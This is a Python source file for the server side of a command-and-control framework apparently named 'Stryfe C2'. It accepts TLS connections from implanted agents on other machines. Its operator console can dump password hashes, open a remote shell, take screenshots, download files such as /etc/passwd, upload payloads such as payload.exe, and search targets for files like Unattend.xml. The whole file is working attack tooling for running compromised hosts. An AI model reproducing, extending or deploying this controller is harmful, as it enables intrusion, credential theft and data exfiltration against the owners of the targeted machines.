import socket, threading, ssl
import secrets, os, platform, json
from agent import Agent
from symbols import *

class Server:
                                                                      
    def __init__(self, address, port):
        self.address = address
        self.port = port
        self.agents = []
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.current_id = 1
        self.platform = platform.system() # Initialize the C2 platform
        self.stop_event = threading.Event() # Test to stop threads
        self.current_agent = Agent(['',''],'',0) # Dummy agent for initialisation
        self.banner = """
                        ███████╗████████╗██████╗ ██╗   ██╗███████╗███████╗     ██████╗██████╗ 
                        ██╔════╝╚══██╔══╝██╔══██╗╚██╗ ██╔╝██╔════╝██╔════╝    ██╔════╝╚════██╗
                        ███████╗   ██║   ██████╔╝ ╚████╔╝ █████╗  █████╗      ██║      █████╔╝
                        ╚════██║   ██║   ██╔══██╗  ╚██╔╝  ██╔══╝  ██╔══╝      ██║     ██╔═══╝ 
                        ███████║   ██║   ██║  ██║   ██║   ██║     ███████╗    ╚██████╗███████╗
                        ╚══════╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝     ╚═════╝╚══════╝
"""

        self.commands = {
            'exit': {
                'function': self.exit,
                'description': 'Exit the server'
            },
            'agents': {
                'function': self.displayAgents,
                'description': 'List all connected agents'
            },
            'agent': {
                'function': self.selectAgent,
                'description': 'Select an agent by ID | ID: Integer | Ex: agent 3'
            },
            'bg': {
                'function': self.background,
                'description': 'Deselect the current agent'
            },
            'kill': {
                'function': self.killAgent,
                'description': 'Kill an agent by id | ID: Integer | kill 4'
            },
            'help': {
                'function': self.help,
                'description': 'Show this help message'
            }
        }

        self.agent_commands = {
            'upload': {
                'function': self.upload,
                'description': 'Upload a file to selected target | LOCAL_FILE: String   REMOTE_DEST: String | upload payload.exe /tmp/payload.exe'
            },
            'hashdump': {
                'function': self.hashdump,
                'description': 'Dump the hashes from the target'
            },
            'search': {
                'function': self.search,
                'description': 'Search a file on the target\'s filesystem '
            },
            'ipconfig': {
                'function': self.ipconfig,
                'description': 'Retrieve the IP Configuration from the current target '
            },
                        'shell': {
                'function': self.shell,
                'description': 'Open a reverse shell from the selected agent (type exit to quit the shell)'
            },
            'screenshot': {
                'function': self.screenshot,
                'description': 'Take a screenshot from the selected agent, you can optionally specify a name for the screenshot | Optional: FILE: String | screenshot [my_screenshot]'
            },
            'download': {
                'function': self.download,
                'description': 'Download the specified files | FILE: String | Ex: download /etc/passwd /etc/hosts'
            }
        }

    def __str__(self):
        return f"Server: {len(self.agents)} agents connected"

    def addAgent(self, agentToAdd: 'Agent'):
        """Add an agent to the C2 list"""
        self.agents.append(agentToAdd)

    def help(self, args):
        """Print help for commands"""
        print("\nAvailable Commands:")
        print("=" * 20)
        for cmd, info in self.agent_commands.items():
            print(f"{cmd:<12}: {info['description']}")
        for cmd, info in self.commands.items():
            print(f"{cmd:<12}: {info['description']}")
        print("=" * 20)
        print("Usage:")
        print("  command [args]\n")

    def handleClient(self, client_socket):
        """
        Receive basic informations about the target:
        - MAC address in integer
        - User running the agent
        - UID of the agent (see getClientUID method in client)
        """

        json_string = client_socket.recv(4096).decode()
        json_object = json.loads(json_string)

        agent = self.newAgent(client_socket.getpeername(), client_socket, json_object['uid'])

        agent.hostname = json_object['hostname']
        agent.user = json_object['user']
        agent.mac = json_object['mac']
        agent.uid = json_object['uid']


    def acceptConnections(self):
        """Loop accepting incoming connections"""
        while not self.stop_event.is_set():
            client_socket, client_address = self.sock.accept()
            try:
                client_socket = self.context.wrap_socket(client_socket, server_side=True)
                self.handleClient(client_socket)
            except ssl.SSLError as e:
                print(f"SSL error: {e}")

    def start(self):
        """Start the server, socket initialization, binding, listening and creation of SSL context for encryption"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((self.address, self.port))
        self.sock.listen(5)
        
        self.context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self.context.load_cert_chain(certfile="server.crt", keyfile="server.key")

        print(self.banner)
        threading.Thread(target=self.acceptConnections).start()

    def main_loop(self):
        while True:
            active_agent = f"[{len(self.agents)} active]" if self.current_agent.id == 0 else f"[Agent {self.current_agent.id}]"
            command = input(f"{active_agent}> ").strip()

            if command:
                command_name, *args = command.split(' ')
                command_name = command_name.lower()
                if command_name in self.commands:
                    self.commands[command_name]['function'](' '.join(args))
                elif command_name in self.agent_commands:
                    if self.isAgentSelected():
                        self.agent_commands[command_name]['function'](' '.join(args))
                else:
                    print(f"Unknown command: {command_name}")

    def exit(self, args):
        self.closeAllConn()
        self.stop_event.set()
        self.server_socket.close()
        exit(0)

    def displayAgents(self, args):
        """Display all connected agents"""
        if self.agents:
            print("")
            print("=" * 90)
            print(f"{'ID':<5}{'IP Address':<20}{'Port':<10}{'User':<15}{'Hostname':<30}")
            print("-" * 90)
            for agent in self.agents:
                print(f"{agent.id:<5}{agent.ip:<20}{agent.port:<10}{agent.user:<15}{agent.hostname:<30}")
            print("=" * 90)
            print("")
        else:
            print("No agents connected")

    def selectAgent(self, args):
        try:
            id = int(args)
        except ValueError:
            print("Agent ID needs to be an Integer")
            return
        for agent in self.agents:
            if agent.id == id:
                self.current_agent = self.getAgent(id)
                return
        print(f"No agent with ID {id}")
            


    def shell(self, args):
        self.current_agent.sock.sendall("shell".encode())
        while True:
            command = input('$> ').strip()
            if command == '':
                continue
            if command.lower() == 'exit':
                self.current_agent.sock.sendall("exit".encode())
                break
            self.current_agent.sock.sendall(command.encode())
            print(self.current_agent.sock.recv(8192).decode('latin1'))

    def screenshot(self, args):
        self.current_agent.sock.sendall("screenshot".encode())
        args = list(filter(lambda x: x != "", args.split(" ")))
        if len(args) >= 1:
            screen_path = f"{args[0]}.jpg"
        else:
            screen_path = f"{secrets.token_hex(5)}.jpg"
        with open(screen_path, 'wb') as f:
            while True:
                data = self.current_agent.sock.recv(1024)
                if (data == SIG_EOF) or (not data):
                    break
                f.write(data)
        print(f'Screenshot saved at {screen_path}')
    
    def download(self, args):
        self.current_agent.sock.sendall(f"download {args}".encode())
        args = list(filter(lambda x: x != "", args.split(" ")))
        if len(args) < 1:
            print("Please select at least one remote file to download\n\tEx: download /etc/passwd")
            return
        for file_path in args:
            file = os.path.basename(file_path)
            with open(file, 'w+b') as f:
                while True:
                    data = self.current_agent.sock.recv(1024)
                    decoded_data = data.decode("latin1")
                    if (data == SIG_EOF) or (not data):
                        break
                    if (decoded_data.startswith("ERROR:")):
                        print(decoded_data)
                        os.remove(file)
                        return
                    f.write(data)
            slash = ""
            if self.platform == 'Linux':
                slash = '/'
            else:
                slash = '\\'
            print(f'File saved at {os.getcwd()}{slash}{file}')
    
    def upload(self, args):
        args = list(filter(lambda x: x != "", args.split(" ")))
        if len(args) < 2:
            print("Please select a local file path and a remote path\n\tEx: upload payload.exe C:\\Users\\john\\Desktop\\payload.exe")
            return
        self.current_agent.sock.sendall(f"upload {args[1]}".encode())
        with open(args[0], 'rb') as f:
            while (chunk := f.read(1024)):
                self.current_agent.sock.sendall(chunk)
        self.current_agent.sock.sendall(SIG_EOF)
        print("File sent to agent")
    
    def isAgentSelected(self):
        if self.current_agent.id != 0:
            return True
        else:
            print("Please select an agent")


    def background(self, args):
        self.current_agent = Agent(['',''],'',0)

    def closeAllConn(self):
        for agent in self.agents:
            agent.sock.close()

    def newAgent(self, client_address, client_socket, uid):
        agent_id = self.current_id
        agent = Agent(client_address, client_socket, agent_id)
        self.current_id += 1
        print(f"\n[!] New connection:\n{agent}")
        self.addAgent(agent)
        return agent
    
    def killAgent(self, id):
        try:
            id = int(id)
        except ValueError:
            print("Agent ID needs to be an Integer")            
        for index, agent in enumerate(self.agents):
            if agent.id == id:
                agent.sock.close()
                self.agents.pop(index)
                break
        if self.current_agent.id == id:
            self.current_agent = Agent(['',''],'',0) # Reset with a dummy agent

    def hashdump(self, args):
        args = list(filter(lambda x: x != "", args.split(" ")))
        if len(args) < 1:
            print("Please select a path to store the results\n\tEx: hashdump password.hashes")
            return
        file = args[0]
        self.current_agent.sock.sendall("hashdump".encode())
        remfile = False
        with open(file, 'w+b') as f:
            while True:
                data = self.current_agent.sock.recv(1024)
                decoded_data = data.decode("latin1")
                if (data == SIG_EOF) or (not data):
                    break
                elif (data == ERROR_INSUFFICIENT_PERMS):
                    print(f"ERROR: Insufficient permissions to dump hashes.")
                    remfile = True
                    f.close()
                    os.remove(file)
                    return
                f.write(data)
        print(f'Hashes saved at {file}')

    def getAgent(self, id):
        for agent in self.agents:
            if agent.id == id:
                return agent
    
    def ipconfig(self, args):
        self.current_agent.sock.sendall("ipconfig".encode())
        data = self.current_agent.sock.recv(16384)
        print(data.decode('utf-8'))
    
    def search(self,args):
        args = list(filter(lambda x: x != "", args.split(" ")))
        if len(args) < 2:
            print("Please specify a starting path and a file name\n\tEx: search C:\\ Unattend.xml")
            return
        self.current_agent.sock.sendall(f"search {args[0]} {args[1]}".encode())
        while True:
            data = self.current_agent.sock.recv(1024)
            decoded_data = data.decode("latin1")
            if (data == SIG_EOF) or (not data):
                break
            print('---')
            print(decoded_data)